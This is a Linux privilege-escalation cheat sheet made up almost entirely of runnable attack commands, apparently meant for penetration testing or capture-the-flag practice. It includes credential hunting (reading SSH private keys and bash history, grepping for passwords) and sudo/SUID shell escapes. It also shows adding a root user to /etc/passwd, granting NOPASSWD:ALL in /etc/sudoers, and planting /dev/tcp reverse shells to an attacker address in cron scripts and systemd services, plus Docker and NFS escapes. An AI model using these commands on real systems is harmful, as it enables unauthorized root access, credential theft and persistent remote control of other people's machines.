# Linux privilege escalation , professional cheat sheet 
## First , initial enumeration : 
### system info 
```
uname -a
cat /etc/os-release
hostname
```
### users and groups :
```
id
whoami
cat /etc/passwd
groups
```
### logged in users :
```
who -a
w
last -a
```
### Sudo permissions :
```
sudo -l
```
### PATH , env :
```
echo $PATH
env
```
### Running processes :
```
ps aux
ps -ef
```
### Networks :
```
ip a
ip r
ss -tunlp
```
# file & directory misconfigurations
### Writable folders :
```
find / -writable -type d 2>/dev/null
```
###   World-writables files :
```
find / -perm -2 -type f 2>/dev/null
```
### SUID binaries :
```
find / -perm -4000 -type f 2>/dev/null
```
### SUID GTFOBins Quick Wins: 
```
/usr/bin/find
/usr/bin/bash
/usr/bin/python
/usr/bin/perl
/usr/bin/nmap
/usr/bin/vim
```
 example : 
 ```
find . -exec /bin/bash -p \; -quit
```
# Passwords and credential hunting :
### Search for passwords in files :
```
grep -Ri "password" / 2>/dev/null
```
### Check bash history : 
```
cat ~/.bash_history
```
### SSH keys : 
```
ls -la ~/.ssh/
cat ~/.ssh/id_rsa
```
### Config files with secrets :
```
find / -name "*.conf" -o -name "*.env" -o -name "*.ini" 2>/dev/null
```
### Cron jobs with passwords 
```
cat /etc/crontab
ls -la /etc/cron.*
```
# Sudo abuse (GTFOBins) 
If you find something in sudo -l , try the GTFO trick.

Examples:
```
sudo bash
```
### python 
```
sudo python3 -c 'import pty; import os; os.execve("/bin/bash", ["bash"], os.environ)'
```
### tar 
```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```
### vim 
```
sudo vim -c ':!/bin/bash'
```
### less 
```
sudo less /etc/passwd
!bash
```
# Kernel exploits (Dirty COW, etc.)
### check kernal vrsions : 
```
uname -r
```
### check exploits suggestions 
```
searchsploit linux kernel <version>
```
# weak file permissions : 
### writable etc/passwd : 
If writable just add a root user:
```
openssl passwd -1 "password"
```
Then add line:
```
root2:$1$something$something:0:0:root:/root:/bin/bash
```
### writable /etc/sudoers 
```
echo "user ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers
```
# Cron job exploits
### view cron 
```
cat /etc/crontab
ls -la /etc/cron.d/
```
if script is writable then inject reverse shell
```
echo 'bash -i >& /dev/tcp/YOURIP/4444 0>&1' >> /path/script.sh
```
# capabilties exploits :
check it : 
```
getcap -r / 2>/dev/null
```
### common privilege escalation : 
python : 
```
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
perl : 
```
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'
```
# Docker / LXC escape 
### check if user in docker : 
```
id
grep docker /etc/group
```
if yes : 
```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
# NFS priv-esc : 
### show nfs mounts : 
```
cat /etc/exports
```
If no_root_squash:

On attacker:
```
sudo su
echo 'int main(){setuid(0);system("/bin/bash");}' > root.c
gcc root.c -o root
```
# Path hijacking : 
### If a script runs with sudo/root and calls a command:
```
echo "bash -p" > /tmp/fake
chmod +x /tmp/fake
export PATH=/tmp:$PATH
script.sh
```
# Exploiting services : 
### systemd services :   
```
systemctl list-units --type=service
systemctl status <service>
```
Check:
-Writable service file?
-EnvironmentFile writable?
-Service runs as root?
If writable:
```
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'
```
# Reload : 
```
systemctl daemon-reload
systemctl restart <service>
```
# A very uselful auto auto-enum script : 
(Use them ONLY when allowed)
linpeas.sh
lse.sh
linenum.sh
Upload then run:
```
wget <url>/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```
